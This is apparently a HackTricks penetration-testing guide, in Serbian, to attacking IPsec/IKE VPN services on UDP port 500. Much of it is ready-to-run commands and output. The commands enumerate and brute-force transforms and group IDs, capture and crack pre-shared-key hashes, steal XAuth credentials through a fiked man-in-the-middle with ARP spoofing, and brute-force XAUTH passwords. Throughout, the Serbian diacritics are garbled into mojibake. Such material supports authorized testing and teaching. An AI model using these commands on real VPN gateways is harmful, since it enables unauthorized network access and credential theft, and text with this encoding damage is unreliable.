# 500/udp - Testiranje IPsec/IKE VPN

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Osnovne informacije

**IPsec** je 코iroko prepoznat kao glavna tehnologija za obezbe캠ivanje komunikacije izme캠u mre쬬 (LAN-to-LAN) i od udaljenih korisnika do mre쬹og pristupnog 캜vora (udaljeni pristup), slu쬰캖i kao osnova za re코enja preduze캖a za VPN.

Uspostavljanje **bezbednosne asocijacije (SA)** izme캠u dve ta캜ke upravlja **IKE**, koji funkcioni코e pod okriljem ISAKMP, protokola dizajniranog za autentifikaciju i razmenu klju캜eva. Ovaj proces se odvija u nekoliko faza:

* **Faza 1:** Bezbedan kanal se kreira izme캠u dve ta캜ke. To se posti쬰 kori코캖enjem Pre-Shared Key (PSK) ili sertifikata, koriste캖i ili glavni re쬴m, koji uklju캜uje tri para poruka, ili **agresivni re쬴m**.
* **Faza 1.5:** Iako nije obavezna, ova faza, poznata kao Faza Pro코irene Autentifikacije, proverava identitet korisnika koji poku코ava da se pove쬰 zahtevaju캖i korisni캜ko ime i lozinku.
* **Faza 2:** Ova faza je posve캖ena pregovaranju parametara za obezbe캠ivanje podataka sa **ESP** i **AH**. To omogu캖ava kori코캖enje algoritama razli캜itih od onih u Fazi 1 kako bi se osigurala **Savr코ena Napredna Tajnost (PFS)**, pobolj코avaju캖i bezbednost.

**Podrazumevani port:** 500/udp

## **Otkrijte** uslugu kori코캖enjem nmap-a
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Pronala쬰nje validne transformacije**

IPSec konfiguracija mo쬰 biti pode코ena da prihvati samo jednu ili nekoliko transformacija. Transformacija je kombinacija vrednosti. **Svaka transformacija** sadr쬴 broj atributa kao 코to su DES ili 3DES kao **algoritam za enkripciju**, SHA ili MD5 kao **algoritam za integritet**, prethodno deljeni klju캜 kao **tip autentifikacije**, Diffie-Hellman 1 ili 2 kao algoritam za **distribuciju klju캜a** i 28800 sekundi kao **쬴votni vek**.

Prvo 코to morate uraditi je **prona캖i validnu transformaciju**, tako da 캖e server komunicirati sa vama. Za to mo쬰te koristiti alat **ike-scan**. Podrazumevano, Ike-scan radi u glavnom re쬴mu i 코alje paket ka pristupnoj ta캜ki sa ISAKMP zaglavljem i jednim predlogom sa **osam transformacija unutar njega**.

Na osnovu odgovora mo쬰te dobiti informacije o krajnjoj ta캜ki:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Kao 코to mo쬰te videti u prethodnom odgovoru, postoji polje nazvano **AUTH** sa vredno코캖u **PSK**. To zna캜i da je VPN konfigurisan kori코캖enjem unapred podele klju캜a (i ovo je zaista dobro za pentestera).\
**Vrednost poslednje linije je tako캠e veoma va쬹a:**

* _0 returned handshake; 0 returned notify:_ Ovo zna캜i da meta nije **IPsec gateway**.
* _**1 returned handshake; 0 returned notify:**_ Ovo zna캜i da je **meta konfigurisana za IPsec i spremna je da obavi IKE pregovore, i da je jedan ili vi코e transformacija koje ste predlo쬴li prihvatljivo** (va쬰캖a transformacija 캖e biti prikazana u izlazu).
* _0 returned handshake; 1 returned notify:_ VPN gateway-ovi odgovaraju sa obave코tenjem kada **nijedna od transformacija nije prihvatljiva** (mada neki gateway-ovi to ne rade, u tom slu캜aju treba poku코ati sa daljom analizom i revidiranim predlogom).

Zatim, u ovom slu캜aju ve캖 imamo va쬰캖u transformaciju, ali ako se nalazite u 3. slu캜aju, tada morate **mal캜ice probati sa brute-force-om da biste prona코li va쬰캖u transformaciju:**

Prvo morate kreirati sve mogu캖e transformacije:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
I onda svaki od njih probajte napasti brute-force metodom koriste캖i ike-scan (ovo mo쬰 potrajati nekoliko minuta):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Ako brute-force nije uspeo, mo쬯a server odgovara bez rukovanja 캜ak i na validne transformacije. Zatim, mo쬰te poku코ati isti brute-force ali koriste캖i agresivni re쬴m:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Nadam se da 캖e **va쬰캖a transformacija biti vra캖ena**.\
Mo쬰te poku코ati **isti napad** koriste캖i [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Tako캠e mo쬰te poku코ati da grubo forsirate transformacije sa [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (614).png>)

U **DH grupi: 14 = 2048-bitni MODP** i **15 = 3072-bitni**\
**2 = HMAC-SHA = SHA1 (u ovom slu캜aju). Format `--trans` je $Enc,$Hash,$Auth,$DH**

Cisco preporu캜uje izbegavanje kori코캖enja DH grupa 1 i 2 jer nisu dovoljno jake. Stru캜njaci veruju da **zemlje sa velikim resursima lako mogu probiti enkripciju** podataka koji koriste ove slabe grupe. To se posti쬰 kori코캖enjem posebnog metoda koji ih priprema da brzo probiju kodove. Iako ko코ta puno novca postaviti ovaj metod, omogu캖ava ovim mo캖nim zemljama da 캜itaju enkriptovane podatke u realnom vremenu ako koriste grupu koja nije jaka (kao 코to je 1,024-bitna ili manja).

### Fingerprintiranje servera

Zatim, mo쬰te koristiti ike-scan da poku코ate **otkriti proizvo캠a캜a** ure캠aja. Alat 코alje po캜etni predlog i prestaje sa reprodukcijom. Zatim, **analizira** **razliku u vremenu** izme캠u primljenih **poruka** od servera i odgovaraju캖eg obrasca odgovora, pentester mo쬰 uspe코no identifikovati proizvo캠a캜a VPN gateway-a. Tako캠e, neki VPN serveri 캖e koristiti opcioni **Vendor ID (VID) payload** sa IKE.

**Navedite validnu transformaciju ako je potrebno** (koriste캖i --trans)

Ako IKE otkrije koji je proizvo캠a캜, isprinta캖e ga:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Ovo mo쬰 biti postignuto i sa nmap skriptom _**ike-version**_

## Pronala쬰nje ta캜nog ID-a (imenovanje grupe)

Da biste bili u mogu캖nosti da uhvatite he코, potreban vam je validan transform koji podr쬬va Agresivni re쬴m i ta캜an ID (ime grupe). Verovatno ne캖ete znati validno ime grupe, pa 캖ete morati da ga probate silom.
Da biste to uradili, preporu캜io bih vam 2 metode:

### Silom probijanje ID-a sa ike-scan

Prvo poku코ajte da napravite zahtev sa la쬹im ID-om poku코avaju캖i da prikupite he코 ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Ako **nema povratne vrednosti he코a**, tada 캖e verovatno ovaj metod brute force napada raditi. **Ako se vrati neki he코, to zna캜i da 캖e se za la쬹i ID poslati la쬹i he코, pa ovaj metod ne캖e biti pouzdan** za brute-force napad na ID. Na primer, mo쬰 se vratiti la쬹i he코 (ovo se de코ava u modernim verzijama):

![](<../.gitbook/assets/image (914).png>)

Ali ako, kao 코to sam rekao, nema povratne vrednosti he코a, tada biste trebali poku코ati da brute-force napadnete zajedni캜ka imena grupa koriste캖i ike-scan.

Ovaj skript **캖e poku코ati da brute-force napadne mogu캖e ID-ove** i vrati캖e ID-ove gde je vra캖en validan handshake (ovo 캖e biti validno ime grupe).

Ako ste otkrili odre캠enu transformaciju, dodajte je u ike-scan komandu. Ako ste otkrili vi코e transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih isprobate sve dok jedna od njih pravilno funkcioni코e).

Mo쬰te koristiti [re캜nik ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ili [onaj u seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) zajedni캜kih imena grupa za brute-force napade na njih:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### Bruteforcing ID with Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tako캠e koristi **ike-scan** za poku코aj otkrivanja mogu캖ih imena grupa. Prati svoju metodu za **pronala쬰nje validnog ID-a na osnovu izlaza ike-scan-a**.

### Bruteforcing ID with ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) je alat koji se mo쬰 koristiti za **bruteforce ID-ova tako캠e**. Ovaj alat 캖e **poku코ati iskoristiti razli캜ite ranjivosti** koje bi mogle biti kori코tene za **razlikovanje izme캠u validnog i nevalidnog ID-a** (mo쬰 imati la쬹e pozitivne i la쬹e negativne rezultate, zbog 캜ega preferiram kori코캖enje metode ike-scan-a ako je mogu캖e).

Podrazumevano, **ikeforce** 캖e na po캜etku poslati neke nasumi캜ne ID-ove kako bi proverio pona코anje servera i odredio taktiku koju 캖e koristiti.

* **Prva metoda** je da brute-force-uje imena grupa **tra쬰캖i** informacije **Dead Peer Detection DPD** Cisco sistema (ove informacije server emituje samo ako je ime grupe ta캜no).
* **Druga dostupna metoda** je da **proveri broj poslatih odgovora za svaki poku코aj** jer se ponekad 코alje vi코e paketa kada se koristi ta캜an ID.
* **Tre캖a metoda** sastoji se od **tra쬰nja "INVALID-ID-INFORMATION" u odgovoru na neispravan ID**.
* Na kraju, ako server ne emituje ni코ta kao odgovor na provere, **ikeforce** 캖e poku코ati da brute-force-uje server i proveri da li server emituje neki paket kada se po코alje ta캜an ID.\
O캜igledno je cilj brute force-ovanja ID-a da se dobije **PSK** kada imate validan ID. Zatim, sa **ID-om** i **PSK-om** mora캖ete da brute-force-ujete XAUTH (ako je omogu캖en).

Ako ste otkrili odre캠enu transformaciju, dodajte je u ikeforce komandu. I ako ste otkrili vi코e transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebalo bi da ih isprobate sve dok jedna od njih pravilno funkcioni코e).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(Iz knjige **Procena bezbednosti mre쬰: Upoznajte svoju mre쬿**): Tako캠e je mogu캖e dobiti validna korisni캜ka imena 코pijuniranjem veze izme캠u VPN klijenta i servera, jer se prvi paket agresivnog moda koji sadr쬴 ID klijenta 코alje otvoreno

![](<../.gitbook/assets/image (888).png>)

## Snimanje i de코ifrovanje he코a

Na kraju, ako ste prona코li **validnu transformaciju** i **ime grupe** i ako je **agresivni mod dozvoljen**, tada mo쬰te veoma lako uhvatiti de코ifrovan he코:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash 캖e biti sa캜uvan unutar _hash.txt_.

Mo쬰te koristiti **psk-crack**, **john** (koriste캖i [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) i **hashcat** da **provalite** hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresivni re쬴m IKE** u kombinaciji sa **Pre-Shared Key (PSK)** se 캜esto koristi u svrhu **grupne autentikacije**. Ovaj metod se pro코iruje sa **XAuth (Extended Authentication)**, koji slu쬴 da uvede dodatni sloj **autentikacije korisnika**. Takva autentikacija obi캜no koristi usluge poput **Microsoft Active Directory**, **RADIUS**, ili sli캜nih sistema.

Prelaskom na **IKEv2**, prime캖uje se zna캜ajna promena gde se koristi **EAP (Extensible Authentication Protocol)** umesto **XAuth** u svrhu autentikacije korisnika. Ova promena isti캜e evoluciju praksi autentikacije unutar sigurnih komunikacionih protokola.

### MitM napad na lokalnu mre쬿 za hvatanje akreditiva

Tako da mo쬰te uhvatiti podatke o prijavi koriste캖i _fiked_ i videti da li postoji neko podrazumevano korisni캜ko ime (Morate preusmeriti IKE saobra캖aj na `fiked` za 코pijuniranje, 코to se mo쬰 uraditi uz pomo캖 ARP spoofinga, [vi코e informacija](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked 캖e delovati kao VPN krajnja ta캜ka i uhvati캖e XAuth akreditive:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### Napad srednjeg 캜oveka (MitM) i blokiranje saobra캖aja na portu 500 pomo캖u IPSec-a

Tako캠e, poku코ajte da izvr코ite napad srednjeg 캜oveka (MitM) i blokirate sav saobra캖aj ka portu 500 kori코캖enjem IPSec-a. Ako tunel IPSec-a ne mo쬰 da se uspostavi, mo쬯a 캖e se saobra캖aj slati ne코ifrovan.

### Brute-forcing XAUTH korisni캜ko ime i lozinku pomo캖u ikeforce

Da biste primenili **XAUTH** metodu (kada znate validno ime grupe **id** i **psk**), mo쬰te koristiti korisni캜ko ime ili listu korisni캜kih imena i listu lozinki:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Na ovaj na캜in, ikeforce 캖e poku코ati da se pove쬰 koriste캖i svaku kombinaciju korisni캜ko ime: lozinka.

Ako prona캠ete jednu ili vi코e validnih transformacija, jednostavno ih koristite kao u prethodnim koracima.

## Autentikacija sa IPSEC VPN

U Kali-u, **VPNC** se koristi za uspostavljanje IPsec tunela. **Profili** se moraju nalaziti u direktorijumu `/etc/vpnc/`. Mo쬰te pokrenuti ove profile koriste캖i komandu _**vpnc**_.

Naredbe i konfiguracije u nastavku ilustruju proces postavljanja VPN veze pomo캖u VPNC-a:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
U ovom postavci:

* Zamijenite `[VPN_GATEWAY_IP]` stvarnom IP adresom VPN gateway-a.
* Zamijenite `[VPN_CONNECTION_ID]` sa identifikatorom VPN veze.
* Zamijenite `[VPN_GROUP_SECRET]` sa grupnim tajnim klju캜em VPN-a.
* Zamijenite `[VPN_USERNAME]` i `[VPN_PASSWORD]` sa autentifikacionim podacima VPN-a.
* `[PID]` simbolizuje ID procesa koji 캖e biti dodeljen kada `vpnc` pokrene.

Uverite se da se koriste stvarne, sigurne vrednosti za zamenu oznaka prilikom konfigurisanja VPN-a.

## Reference Materijal

* [PSK cracking rad](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Skeniranje VPN implementacije](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3. izdanje

## Shodan

* `port:500 IKE`

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
